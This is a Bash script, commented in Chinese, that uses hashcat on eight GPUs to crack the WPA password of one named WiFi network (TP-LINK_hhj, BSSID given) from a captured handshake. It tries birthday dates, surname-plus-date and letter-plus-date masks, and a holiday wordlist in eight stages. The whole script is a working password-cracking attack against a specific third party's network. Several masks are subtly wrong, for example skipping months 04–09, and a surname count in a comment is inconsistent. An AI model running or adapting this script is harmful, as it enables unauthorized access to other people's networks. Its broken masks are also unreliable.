#!/bin/bash
# WiFi 生日密码专用破解脚本 (YYYYMMDD格式: 19700101-20251231)
# 针对个人信息相关密码的高效攻击策略

# 密码空间计算函数
calculate_password_space() {
    local pattern="$1"
    local description="$2"
    local space=0
    
    case "$pattern" in
        "8digit_birthday_1980s")
            # 1980-1989年，所有月日组合: 10年 × 12月 × 31日 = 3720 (实际约3650个有效日期)
            space=3650
            ;;
        "8digit_birthday_1990s") 
            # 1990-1999年: 10年 × 12月 × 31日 = 3650个有效日期
            space=3650
            ;;
        "8digit_birthday_2000s")
            # 2000-2009年: 10年 × 12月 × 31日 = 3650个有效日期  
            space=3650
            ;;
        "8digit_birthday_full")
            # 1970-2025年: 56年 × 12月 × 31日 = 20440个有效日期
            space=20440
            ;;
        "surname_birthday")
            # 24个姓氏 × 3650个1990年代生日 = 87600个密码
            space=87600
            ;;
        "2letter_birthday")
            # 26×26个字母组合 × 3650个1990年代生日 = 2,662,400个密码
            space=2662400
            ;;
        "3letter_birthday")
            # 26×26×26个字母组合 × 3650个1990年代生日 = 69,224,400个密码
            space=69224400
            ;;
    esac
    
    echo "密码空间: $(printf "%'d" $space) 个可能的密码"
    
    # 基于8.8MH/s速度计算预估时间
    local seconds=$(echo "scale=2; $space / 8800000" | bc -l)
    if (( $(echo "$seconds < 60" | bc -l) )); then
        echo "预估时间: ${seconds}秒"
    elif (( $(echo "$seconds < 3600" | bc -l) )); then
        local minutes=$(echo "scale=1; $seconds / 60" | bc -l)
        echo "预估时间: ${minutes}分钟"
    elif (( $(echo "$seconds < 86400" | bc -l) )); then
        local hours=$(echo "scale=1; $seconds / 3600" | bc -l)
        echo "预估时间: ${hours}小时"
    else
        local days=$(echo "scale=1; $seconds / 86400" | bc -l)
        echo "预估时间: ${days}天"
    fi
}

echo "=== WiFi 生日密码专用破解工具 (YYYYMMDD格式) ==="
echo "目标网络: TP-LINK_hhj"
echo "BSSID: 30:fc:68:76:6b:88"
echo "设备: 8×NVIDIA GeForce RTX 3090"
echo "性能: 8.8 MH/s"
echo "生日格式: YYYYMMDD (19700101-20251231)"
echo "==============================="

# 切换到hashcat目录
cd /home/aiserver/ai/data/code/dic/hashcat-6.2.6

# 握手包文件路径
HANDSHAKE="../handshake_22000.hc22000"

# 检查密码是否已破解的函数
check_cracked() {
    if ./hashcat -m 22000 $HANDSHAKE --show 2>/dev/null | grep -q ":"; then
        echo "✅ 密码已找到!"
        ./hashcat -m 22000 $HANDSHAKE --show
        echo "破解完成，程序退出。"
        exit 0
    fi
}

echo "[阶段1/8] 8位生日数字攻击 - 1980年代"
calculate_password_space "8digit_birthday_1980s"
echo "正在尝试1980-1989年生日..."
./hashcat -m 22000 $HANDSHAKE -a 3 "198?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=5
check_cracked

echo "[阶段2/8] 8位生日数字攻击 - 1990年代"
calculate_password_space "8digit_birthday_1990s"
echo "正在尝试1990-1999年生日..."
./hashcat -m 22000 $HANDSHAKE -a 3 "199?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=5
check_cracked

echo "[阶段3/8] 8位生日数字攻击 - 2000年代"
calculate_password_space "8digit_birthday_2000s"
echo "正在尝试2000-2009年生日..."
./hashcat -m 22000 $HANDSHAKE -a 3 "200?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=5
check_cracked

echo "[阶段4/8] 完整8位生日数字攻击"
calculate_password_space "8digit_birthday_full"
echo "正在尝试完整范围 1970-2025年生日..."
# 1970-1979
./hashcat -m 22000 $HANDSHAKE -a 3 "197?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=5
check_cracked
# 2010-2019  
./hashcat -m 22000 $HANDSHAKE -a 3 "201?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=5
check_cracked
# 2020-2025
./hashcat -m 22000 $HANDSHAKE -a 3 "202?1?3?2?d?d" -1 "012345" -2 "0123" -3 "01" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=5
check_cracked

echo "[阶段5/8] 常见姓氏+8位生日攻击"
calculate_password_space "surname_birthday" 
echo "正在尝试常见中文姓氏+生日格式..."

# 创建常见中文姓氏字典
cat > chinese_surnames.txt << EOF
li
zhang
wang
liu
chen
yang
zhao
huang
zhou
wu
xu
sun
zhu
ma
hu
guo
lin
he
gao
liang
zheng
luo
song
xie
tang
han
feng
yu
dong
xiao
EOF

# 1990-1999年高频年份
./hashcat -m 22000 $HANDSHAKE -a 6 chinese_surnames.txt "199?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=10
check_cracked

echo "[阶段6/8] 2位字母+8位生日攻击"
calculate_password_space "2letter_birthday"
echo "正在尝试2位字母缩写+生日格式..."

# 高频年份1990-1999
./hashcat -m 22000 $HANDSHAKE -a 3 "?l?l199?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=10
check_cracked

echo "[阶段7/8] 3位字母+8位生日攻击"
calculate_password_space "3letter_birthday"
echo "正在尝试3位字母缩写+生日格式 (仅高频年份)..."

# 只攻击1990-1999年 (最高频)
./hashcat -m 22000 $HANDSHAKE -a 3 "?l?l?l199?d?1?2?d?d" -1 "01" -2 "0123" -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=15
check_cracked

echo "[阶段8/8] 节假日特殊日期攻击"
echo "密码空间: 18 个特殊日期"
echo "预估时间: < 1秒"
echo "正在尝试特殊节假日日期..."

# 创建特殊日期字典
cat > special_dates.txt << EOF
19700101
19800101
19850101
19900101
19951001
19951225
20000101
20001001
20001225
19900501
19950501
20000501
19881008
19900614
19951024
19991231
20080808
20101010
EOF

./hashcat -m 22000 $HANDSHAKE -a 0 special_dates.txt -d 1,2,3,4,5,6,7,8 --force -O -w 4 --status --status-timer=2
check_cracked

# 最终检查
echo "========================================="
if ./hashcat -m 22000 $HANDSHAKE --show 2>/dev/null | grep -q ":"; then
    echo "🎉 恭喜！密码破解成功！"
    echo "破解结果："
    ./hashcat -m 22000 $HANDSHAKE --show
else
    echo "❌ YYYYMMDD格式生日密码攻击未成功"
    echo "建议尝试其他密码模式："
    echo "- 其他日期格式 (DDMMYYYY, MMDDYYYY)"
    echo "- 更复杂的字母数字组合"
    echo "- 特殊字符组合"
    echo "- 更大的字典文件"
fi

# 清理临时文件
rm -f chinese_surnames.txt special_dates.txt

echo "========================================="
echo "YYYYMMDD格式攻击完成！"